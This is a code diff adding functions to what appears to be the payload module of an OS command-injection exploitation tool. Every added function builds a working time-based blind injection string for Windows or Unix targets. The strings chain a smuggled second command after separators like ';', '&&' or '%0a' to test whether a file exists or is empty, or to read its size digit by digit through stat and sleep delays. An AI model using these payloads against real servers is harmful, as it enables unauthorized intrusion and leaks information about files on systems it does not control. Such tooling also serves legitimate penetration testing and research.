@@ -548,4 +548,220 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
 
   return checks.payload_newline_fixation(payload)
 
+"""
+Efficient file size detection payloads (Issue #783 improvement)
+"""
+
+"""
+Check if file exists using test -f command
+"""
+def file_exists_check(filename, separator, timesec, http_request_method):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    # Windows file existence check using PowerShell
+    if separator == "|" or separator == "||":
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none Test-Path '" + filename + "'\"') "
+                "do if %i==True " + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                )
+    elif separator == _urllib.parse.quote("&&"):
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none Test-Path '" + filename + "'\"') "
+                "do if %i==True " + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                )
+    else:
+      pass
+  else:
+    # Unix/Linux file existence check
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
+                "if [ -f " + filename + " ]" + separator +
+                "then sleep " + str(timesec) + separator +
+                "fi"
+                )
+    elif separator == _urllib.parse.quote("&&"):
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                "[ -f " + filename + " ] " + separator +
+                "sleep " + str(timesec)
+                )
+    elif separator == "||":
+      pipe = "|"
+      payload = (pipe +
+                "[ ! -f " + filename + " ]" + separator +
+                "sleep " + str(timesec)
+                )
+    else:
+      pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return payload
+
+"""
+Check if file is not empty using [ -s filename ]
+"""
+def file_not_empty_check(filename, separator, timesec, http_request_method):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    # Windows file size check using PowerShell
+    if separator == "|" or separator == "||":
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none (Get-Item '" + filename + "').length\"') "
+                "do if %i GTR 0 " + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                )
+    elif separator == _urllib.parse.quote("&&"):
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none (Get-Item '" + filename + "').length\"') "
+                "do if %i GTR 0 " + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                )
+    else:
+      pass
+  else:
+    # Unix/Linux file not empty check
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
+                "if [ -s " + filename + " ]" + separator +
+                "then sleep " + str(timesec) + separator +
+                "fi"
+                )
+    elif separator == _urllib.parse.quote("&&"):
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                "[ -s " + filename + " ] " + separator +
+                "sleep " + str(timesec)
+                )
+    elif separator == "||":
+      pipe = "|"
+      payload = (pipe +
+                "[ ! -s " + filename + " ]" + separator +
+                "sleep " + str(timesec)
+                )
+    else:
+      pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return payload
+
+"""
+Get file size using stat command - length detection (number of digits)
+"""
+def get_stat_output_length(filename, output_length, separator, timesec, http_request_method):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    # Windows file size length check using PowerShell
+    if separator == "|" or separator == "||":
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none ([string](Get-Item '" + filename + "').length).length\"') "
+                "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                )
+    elif separator == _urllib.parse.quote("&&"):
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none ([string](Get-Item '" + filename + "').length).length\"') "
+                "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                )
+    else:
+      pass
+  else:
+    # Unix/Linux stat command length detection
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "stat --printf='%s' " + filename + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
+                "if [ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ]" + separator +
+                "then sleep " + str(timesec) + separator +
+                "fi"
+                )
+    elif separator == _urllib.parse.quote("&&"):
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                "sleep 0 " + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "stat --printf='%s' " + filename + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
+                "[ " + str(output_length) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "1 ] " + separator +
+                "sleep " + str(timesec)
+                )
+    elif separator == "||":
+      pipe = "|"
+      payload = (pipe +
+                "[ " + str(output_length) + " -ne " + settings.CMD_SUB_PREFIX + "stat --printf='%s' " + filename + settings.SINGLE_WHITESPACE +
+                pipe + "wc -c" + settings.CMD_SUB_SUFFIX + " ] " + separator +
+                "sleep " + str(timesec)
+                )
+    else:
+      pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return payload
+
+"""
+Get specific digit from file size using stat command
+"""
+def get_file_size_digit(filename, digit_position, digit_value, separator, timesec, http_request_method):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    # Windows file size digit extraction using PowerShell
+    if separator == "|" or separator == "||":
+      pipe = "|"
+      payload = (pipe + settings.SINGLE_WHITESPACE +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none ([string](Get-Item '" + filename + "').length).substring(" + str(digit_position-1) + ",1)\"') "
+                "do if %i==" + str(digit_value) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                )
+    elif separator == _urllib.parse.quote("&&"):
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none ([string](Get-Item '" + filename + "').length).substring(" + str(digit_position-1) + ",1)\"') "
+                "do if %i==" + str(digit_value) + settings.SINGLE_WHITESPACE +
+                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
+                )
+    else:
+      pass
+  else:
+    # Unix/Linux stat command digit extraction
+    if separator == ";" or separator == "%0a":
+      payload = (separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "stat --printf='%s' " + filename + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "2=" + settings.CMD_SUB_PREFIX + "expr substr \"$" + settings.RANDOM_VAR_GENERATOR + "\" " + str(digit_position) + " 1" + settings.CMD_SUB_SUFFIX + separator +
+                "if [ " + str(digit_value) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "2 ]" + separator +
+                "then sleep " + str(timesec) + separator +
+                "fi"
+                )
+    elif separator == _urllib.parse.quote("&&"):
+      ampersand = _urllib.parse.quote("&")
+      payload = (ampersand +
+                "sleep 0 " + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "stat --printf='%s' " + filename + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "2=" + settings.CMD_SUB_PREFIX + "expr substr \"$" + settings.RANDOM_VAR_GENERATOR + "\" " + str(digit_position) + " 1" + settings.CMD_SUB_SUFFIX + separator +
+                "[ " + str(digit_value) + " -eq $" + settings.RANDOM_VAR_GENERATOR + "2 ] " + separator +
+                "sleep " + str(timesec)
+                )
+    elif separator == "||":
+      pipe = "|"
+      payload = (pipe +
+                "[ " + str(digit_value) + " -ne " + settings.CMD_SUB_PREFIX + "stat --printf='%s' " + filename + settings.SINGLE_WHITESPACE +
+                pipe + "cut -c" + str(digit_position) + "-" + str(digit_position) + settings.CMD_SUB_SUFFIX + " ] " + separator +
+                "sleep " + str(timesec)
+                )
+    else:
+      pass
+
+    if settings.CUSTOM_INJECTION_MARKER:
+      payload = payload + separator
+
+  return payload
+
 # eof
